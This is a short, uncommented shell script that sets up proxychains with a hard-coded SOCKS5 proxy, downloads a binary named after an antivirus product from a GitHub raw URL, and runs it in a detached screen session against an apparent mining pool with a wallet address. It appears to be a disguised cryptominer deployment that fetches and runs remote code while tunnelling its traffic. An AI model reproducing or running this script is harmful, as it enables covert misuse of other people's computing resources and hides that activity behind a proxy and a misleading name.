apt update

apt install proxychains

apt install screen -y

sed -i 's/socks4/socks5/' /etc/proxychains.conf

sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf

sed -i 's/9050/10663/' /etc/proxychains.conf

wget https://raw.githubusercontent.com/renilo/bh/main/avast

chmod +x avast

screen -dmS running ./avast run https://server1.whalestonpool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
